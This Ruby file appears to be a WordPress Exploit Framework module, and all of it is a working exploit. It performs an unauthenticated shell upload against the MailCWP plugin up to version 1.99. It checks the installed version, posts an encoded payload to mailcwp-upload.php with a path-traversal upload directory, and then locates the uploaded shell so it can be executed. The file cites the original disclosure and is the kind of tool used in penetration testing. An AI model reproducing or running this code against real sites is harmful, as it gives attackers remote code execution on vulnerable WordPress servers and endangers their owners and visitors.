# frozen_string_literal: true

class Wpxf::Exploit::MailcwpUnauthenticatedShellUpload < Wpxf::Module
  include Wpxf::WordPress::ShellUpload

  def initialize
    super

    update_info(
      name: 'MailCWP <= v1.99 Unauthenticated Shell Upload',
      author: [
        'Larry W. Cashdollar', # Discovery and disclosure
        'rastating'            # WPXF module
      ],
      references: [
        ['WPVDB', '8090'],
        ['URL', 'http://www.vapid.dhs.org/advisory.php?v=138']
      ],
      date: 'Jul 09 2015'
    )
  end

  def check
    check_plugin_version_from_readme('mailcwp', '1.100')
  end

  def uploader_url
    normalize_uri(wordpress_url_plugins, 'mailcwp', 'mailcwp-upload.php')
  end

  def message_id
    @message_id ||= Utility::Text.rand_numeric(3)
  end

  def upload_request_params
    {
      message_id: message_id,
      upload_dir: '../../uploads'
    }
  end

  def payload_body_builder
    builder = Utility::BodyBuilder.new
    builder.add_file_from_string('file', payload.encoded, payload_name)
    builder
  end

  def uploaded_payload_location
    normalize_uri(wordpress_url_uploads, "#{message_id}-#{payload_name}")
  end
end
